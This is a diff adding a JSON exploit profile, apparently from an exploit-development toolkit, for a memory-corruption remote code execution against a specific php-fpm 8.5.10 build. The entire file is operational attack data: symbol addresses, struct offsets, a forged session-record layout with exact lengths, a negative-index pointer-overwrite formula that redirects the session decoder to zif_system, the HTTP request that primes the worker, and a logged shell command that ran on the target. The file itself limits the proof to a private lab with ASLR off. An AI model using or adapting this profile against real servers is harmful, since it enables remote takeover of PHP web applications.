@@ -1,0 +1,297 @@
+{
+  "name": "g2-fpm-realapps-8510-php",
+  "lane": "fpm",
+  "stage": "G2",
+  "route": "G6 zif serializer decode",
+  "status": "RCE confirmed on the private realapps 8.5.10 target (php session serializer, zif_system); ASLR off; one-shot worker crash; clean zif_passthru real-target run pending",
+  "php_version": "8.5.10",
+  "binary": "/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm",
+  "build_id": "aa489b7c8674d3aa17ecc4e471b152c05bc960b2",
+  "md5": "4ee099823b75e16ea36f93c71d57bfd8",
+  "size_bytes": 67176448,
+  "elf_type": "EXEC",
+  "pie": false,
+  "align16": false,
+  "image_base": "0x400000",
+  "serializer": "php",
+  "original_handler": {
+    "slot": "ps_serializers[1]",
+    "name": "php",
+    "decode_symbol": "ps_srlzr_decode_php",
+    "decode": "0x9e6fae"
+  },
+  "zif_system": "0xa3c061",
+  "zif_passthru": "0xa3c074",
+  "php_exec_ex": "0xa3bdfd",
+  "php_exec": "0xa3bbd7",
+  "record_builder": "php_session_zif",
+  "zif_route": {
+    "decode_slot": "ps_serializers[1].decode",
+    "target": "0x22c54c8",
+    "entry": "0x22c54b8",
+    "active_handler": "php",
+    "type_word_after_write": {
+      "address": "0x22c54d0",
+      "value": 4,
+      "meaning": "zval IS_LONG type word written by php_var_unserialize; php_session_normalize_vars later zeroes it. The value word at 0x22c54c8 keeps 0xa3c061 (the decode pointer)."
+    },
+    "symbol_verification": "nm -an and readelf -sW on the installed realapps binary: zif_system 0xa3c061, zif_passthru 0xa3c074, php_exec_ex 0xa3bdfd, php_exec 0xa3bbd7, php_session_decode 0x9e68b5, ps_srlzr_decode_php 0x9e6fae, ps_serializers 0x22c54a0, ps_globals 0x22d0dc0. A file-offset dump at 0x1cc54a0 confirms the three ps_serializers entries.",
+    "zif_system": {
+      "address": "0xa3c061",
+      "php_exec_type": 1,
+      "behavior": "one-shot: the command executes through php_exec_ex -> php_exec -> popen, then php_exec writes the return zval through return_value=ZSTR_LEN(data); SIGSEGV at php_exec+466"
+    },
+    "zif_passthru": {
+      "address": "0xa3c074",
+      "php_exec_type": 3,
+      "behavior": "symbol verified; expected clean because type 3 never writes return_value. The realapps clean run is pending and is not claimed here.",
+      "delta_from_zif_system": "+0x13 on this build, not the +0x10 seen on the four lab profiles"
+    },
+    "fake_execute_data": {
+      "base": "ZSTR_VAL(data) = X2 + 0x18",
+      "s_0x18": "F; set as specified, not dereferenced on the direct decode path",
+      "num_args_off": "0x2c",
+      "num_args": 1,
+      "arg1_value_off": "0x50",
+      "arg1_value": "F",
+      "arg1_type_off": "0x58",
+      "arg1_type": 6,
+      "zend_string_len_off": "0x10",
+      "zend_string_val_off": "0x18",
+      "f_off": "0x200",
+      "f_relative_to_s": true,
+      "func_read": false,
+      "arg_info_read": false,
+      "f_0xc8": "not set and not used; the measured zend_internal_function.handler is at +0x58 on this binary, but the direct decode callback never dispatches through execute_data->func or a handler slot",
+      "parse_requirement": "num_args==1, arg1 type IS_STRING (6), F readable, F+0x10 == strlen(F+0x18), length non-zero, no embedded NUL"
+    },
+    "record": {
+      "format": "php",
+      "shape": "18 filler strings k0..k17, one forged-name variable with a 768-byte name and a 1.9 MB value, then z",
+      "filler_count": 18,
+      "walker_count": 19,
+      "name_len": 768,
+      "l": 1900000,
+      "offsets_relative_to": "S = ZSTR_VAL(data) of the second decode buffer",
+      "f_off": "0x200",
+      "p_off": "0x18afe8",
+      "b0f_off": "0x1000",
+      "negative_k": "(ps_serializers[1].decode - (B0f + 0x10)) / 16",
+      "lab_k": -8796076063926,
+      "target": "0x22c54c8",
+      "total_lab": 36101091,
+      "postflush_total": 1901104,
+      "note": "The 768-byte forged name is the fake execute_data at S=ZSTR_VAL(data); F is name+0x200. The 1.9 MB value of that variable is copied to vo=chunk+0x1018 and covers P=chunk+0x18c000 and B0f=chunk+0x2018. The receipt's scripts/mkrec.py builds this record; the generic --step g2 builder emits the php_binary G6 shape and rejects this profile."
+    },
+    "producer": {
+      "endpoint": "POST http://127.0.0.1:28866/api.php",
+      "body": "action=parse&format=json&contentmodel=wikibase-item&contentformat=application/vnd.php.serialized plus form field text=@probe_huge450.ser (500,000 B)",
+      "memory_limit": "1024M",
+      "result": "HTTP 200, 276 B; OOM at 1073741824 bytes (tried to allocate 5242880) in EntityContentDataCodec.php:210",
+      "stale_state": "BG(unserialize).level=1, data=P=0x7ffff218c000, B0=0x7ffff219e000, used_slots=1; the consumer must be the next request on the same worker"
+    },
+    "call_flow": [
+      "php_session_rfc1867_update",
+      "php_session_initialize",
+      "php_session_decode",
+      "ps_serializers[1].decode -> zif_system 0xa3c061",
+      "php_exec_ex 0xa3bdfd",
+      "php_exec 0xa3bbd7",
+      "popen /bin/sh -c"
+    ],
+    "marker": {
+      "path": "/tmp/opencode/research/f12b_zif_20261021T222457Z/WIKI_ZIF",
+      "size": 0,
+      "mtime": "2026-10-22 00:29:18.161419346 +0200",
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+    },
+    "crash": {
+      "survived": false,
+      "signal": "SIGSEGV",
+      "rip": "0xa3bda9",
+      "function": "php_exec+466",
+      "instruction": "mov %rax,(%rcx)",
+      "rcx": "0x1d0230",
+      "fault_address_meaning": "1,901,104 = ZSTR_LEN(data); the address is inside the binary r--p mapping 0x01000000-0x01eac000",
+      "cause": "the decode ABI passes rsi=ZSTR_LEN(data) but zif_system treats rsi as zval *return_value; php_exec unconditionally stores the empty-string return zval there after popen"
+    },
+    "respawn": {
+      "worker": 1246030,
+      "fpm_master": 1086116,
+      "replacement_worker": 1249940,
+      "http": "nginx returned 502 (157 B); a later GET /index.php?title=Main_Page returned 200",
+      "pool": "the pool survived; only the worker that ran the exploit died"
+    },
+    "clean_run": "pending; zif_passthru is symbol verified at 0xa3c074 but no realapps clean run is claimed"
+  },
+  "md5_lock": "select this profile only when the target binary md5 matches; a mismatch invalidates every offset",
+  "structs": {
+    "ps_serializer_size": 24,
+    "ps_serializer_name": 0,
+    "ps_serializer_encode": 8,
+    "ps_serializer_decode": 16,
+    "ps_globals_serializer": "0x160",
+    "php_unserialize_data_size": 8216,
+    "php_unserialize_data_last": 0,
+    "php_unserialize_data_first_dtor": 8,
+    "php_unserialize_data_last_dtor": 16,
+    "php_unserialize_data_max_depth": 48,
+    "php_unserialize_data_entries": 56,
+    "var_dtor_entries_size": 4096,
+    "var_dtor_entries_used_slots": 0,
+    "var_dtor_entries_next": 8,
+    "var_dtor_entries_data": 16,
+    "var_entries_max": 1018,
+    "var_dtor_entries_max": 255
+  },
+  "ps_globals": "0x22d0dc0",
+  "ps_serializers": {
+    "table": "0x22c54a0",
+    "table_size_bytes": 792,
+    "terminator": "0x22c54e8",
+    "active_serializer_slot": "0x22d0f20",
+    "active_serializer_ps_globals_offset": "0x160",
+    "default_target": "0x22c54c8",
+    "default_handler": "php",
+    "default_php_decode": "0x22c54c8",
+    "default_php_decode_16b_aligned": false,
+    "note": "the active handler is php (ps_serializers[1]). F12b writes zif_system into its decode field. The php decode slot is 8 mod 16, but the fake var_dtor_entries base B0f is also 8 mod 16, so the negative-K slot is exact. The generic G2/G6 php_binary builder assumes a 16 byte aligned target; this profile is descriptive for F12b and is rejected by --step g2.",
+    "entries": [
+      {
+        "index": 0,
+        "name": "php_serialize",
+        "name_addr": "0x22c54a0",
+        "encode": "0x22c54a8",
+        "decode": "0x22c54b0",
+        "decode_16b_aligned": true
+      },
+      {
+        "index": 1,
+        "name": "php",
+        "name_addr": "0x22c54b8",
+        "encode": "0x22c54c0",
+        "decode": "0x22c54c8",
+        "decode_16b_aligned": false
+      },
+      {
+        "index": 2,
+        "name": "php_binary",
+        "name_addr": "0x22c54d0",
+        "encode": "0x22c54d8",
+        "decode": "0x22c54e0",
+        "decode_16b_aligned": true
+      }
+    ]
+  },
+  "ps_serializer_slot": {
+    "address": "0x22d0f20",
+    "ps_globals": "0x22d0dc0",
+    "offset": "0x160",
+    "aligned_16b": true,
+    "note": "PS(serializer) points at the active ps_serializer entry (0x22c54b8). F12b writes the static ps_serializers[1].decode field instead: a 16-byte typed write at 0x22d0f20 would place its type word at 0x22d0f28, overwriting http_session_vars.value."
+  },
+  "decode_call": {
+    "php_session_decode": "0x9e68b5",
+    "set_len": "0x9e68ef",
+    "set_val": "0x9e68f3",
+    "load_serializer": "0x9e68f7",
+    "call_indirect": "0x9e68fe",
+    "call_form": "call *0x10(%rax)",
+    "rdi": "ZSTR_VAL session record",
+    "rsi": "ZSTR_LEN session record",
+    "note": "ps_globals+0x160 holds 0x22c54b8; the call reads decode at +0x10 = 0x22c54c8. The decode ABI passes rsi=len; zif_system treats it as zval *return_value, so php_exec writes the return zval to the length address."
+  },
+  "write": {
+    "slot_formula": "slot = B0f + 0x10 + 16 * used_slots",
+    "used_slots_formula": "(target - (B0f + 0x10)) / 16",
+    "bound": "only used_slots + num > 255 rejects; negative used_slots pass",
+    "second_slot": "target + 16 = 0x22c54d8 (php_binary.encode; not written by the single z target)",
+    "type_zero_offsets": ["target + 8"],
+    "adjacent_slots": {
+      "target + 8": "php_binary.name (0x22c54d0); zeroed by php_session_normalize_vars",
+      "target + 16": "php_binary.encode (0x22c54d8); not written by the single z target",
+      "target + 24": "php_binary.decode (0x22c54e0); not touched by this record"
+    },
+    "value_form": "i:<n>; parses an IS_LONG zval, so the written pointer is an arbitrary 64 bit value; F12b writes 10731617 = 0xa3c061",
+    "alignment": "target 0x22c54c8 is 8 mod 16 and B0f 0x7ffff2002018 is 8 mod 16, so target - (B0f + 0x10) is divisible by 16. The generic G2/G6 builder assumes a 16 byte aligned target because it places fake B0 at the 16 byte aligned stale B0."
+  },
+  "record": {
+    "format": "php",
+    "command_rule": "the 64-byte command is NUL-free; F+0x10 is its strlen; there is no php_binary 32-byte padding and no trailing #",
+    "fake_p": {
+      "last": "P + 56",
+      "first_dtor": "B0f",
+      "last_dtor": "B0f",
+      "max_depth": "0x7fffffff",
+      "entries_used_slots": 0,
+      "bytes_written": 72
+    },
+    "fake_b0": {
+      "used_slots": "K",
+      "next": 0,
+      "bytes_written": 16
+    },
+    "payload_placement": "the 1.9 MB value of the forged-name variable is copied to vo=chunk+0x1018 and covers both P=chunk+0x18c000 and B0f=chunk+0x2018",
+    "lab_geometry": {
+      "chunk": "0x7ffff2000000",
+      "x2": "0x7ffff2001000",
+      "s": "0x7ffff2001018",
+      "f": "0x7ffff2001218",
+      "p": "0x7ffff218c000",
+      "b0_stale": "0x7ffff219e000",
+      "b0f": "0x7ffff2002018",
+      "total": 36101091,
+      "used_slots": -8796076063926,
+      "cmd_len": 64,
+      "cmd": "touch /tmp/opencode/research/f12b_zif_20261021T222457Z/WIKI_ZIF;",
+      "postflush_total": 1901104,
+      "note": "the first decode buffer X is not recorded in the receipt; X2/S are the second, re-encoded buffer"
+    }
+  },
+  "heap_leak": {
+    "status": "F14 attempted-negative",
+    "measured_relation": "no ASLR capable heap leak; the F12b producer geometry is ASLR off and fixed",
+    "staticleak": {
+      "receipt": "/tmp/opencode/research/staticleak_20261021T214538Z",
+      "verdict": "save path control and static serving proven; M11 encode overread failed; no heap pointer or B0 recovered"
+    },
+    "boot2_candidate": {
+      "receipt": "/tmp/opencode/research/boot2_20261021T214428Z",
+      "status": "lab only; not promoted"
+    },
+    "note": "the F12b proof needs operator supplied X2, P, B0f and the exact record length; it does not demonstrate ASLR-on or internet exploitation"
+  },
+  "prerequisites": [
+    "md5 locked: the installed binary must match 4ee099823b75e16ea36f93c71d57bfd8",
+    "non PIE target (ET_EXEC) so ps_serializers is at a fixed address",
+    "setarch x86_64 -R (ASLR off) and the measured chunk/P/B0 geometry",
+    "producer: anonymous POST /api.php with contentmodel=wikibase-item and contentformat=application/vnd.php.serialized plus the 500 KB probe; OOM at the 1024 MiB limit leaves BG(unserialize).level=1 and the stale P/B0",
+    "the consumer must be the immediately following request on the same worker; any intervening request resets BG(unserialize) at RINIT",
+    "session.serialize_handler=php; session.upload_progress.enabled=1 with the forced END update in the same request",
+    "record: 18 filler strings, one 768-byte forged-name variable with a 1.9 MB value, then z|i:10731617; exact total length 36101091",
+    "single shot per plant: the static decode pointer stays poisoned; the worker must be restarted",
+    "zif_system is one-shot; a clean zif_passthru real-target run is pending",
+    "no ASLR capable heap leak is demonstrated; a real internet target still needs the leak"
+  ],
+  "receipts": {
+    "F12b": "/tmp/opencode/research/f12b_zif_20261021T222457Z",
+    "F12b_producer": "/tmp/opencode/research/wikitype_20261021T212610Z",
+    "G6_lab": "/tmp/opencode/research/g6zif_20261021T222434Z",
+    "G2_lab": "/tmp/opencode/research/fpmgadget_20261021T211940Z",
+    "F14": "/tmp/opencode/research/fpmboot_20261021T214637Z",
+    "F14_staticleak": "/tmp/opencode/research/staticleak_20261021T214538Z",
+    "F14_boot2_candidate": "/tmp/opencode/research/boot2_20261021T214428Z"
+  },
+  "caveats": [
+    "private lab only: ASLR off via setarch x86_64 -R; no ASLR-on and no internet exploitation is claimed",
+    "zif_system is one-shot: the command runs, then php_exec writes the return zval through return_value=ZSTR_LEN(data); the worker SIGSEGVs at php_exec+466 and the FPM master respawns it",
+    "the decode ABI (char *buf, size_t len) does not match zif_system(execute_data, return_value): rsi=len becomes return_value. No fake execute_data field can fix this for type=1",
+    "a writable len (>= about 0x2200000) conflicts with the 2 MiB cached-chunk overlap that carries the fake P/B0/B0f; no survival variant was found or attempted",
+    "the static decode pointer remains poisoned in the worker after the request; the next session decode would re-enter zif_system with a different length. Worker restart is required",
+    "a direct PS(serializer) overwrite at 0x22d0f20 would put the zval type word at 0x22d0f28 (http_session_vars.value); F12b targets the static ps_serializers[1].decode field instead",
+    "F+0xc8 is not used on this path; the measured zend_internal_function.handler is at +0x58, but the decode callback is invoked directly and never dereferences execute_data->func",
+    "the realapps clean zif_passthru run is pending; only the symbol at 0xa3c074 is verified. Do not claim a surviving realapps worker until that run is recorded",
+    "the generic --step g2 builder emits the php_binary G6 record and rejects this profile (record_builder=php_session_zif); the F12b record comes from the receipt's scripts/mkrec.py",
+    "no claim is made for other session savers, opcache, ZTS or shared pools"
+  ]
+}
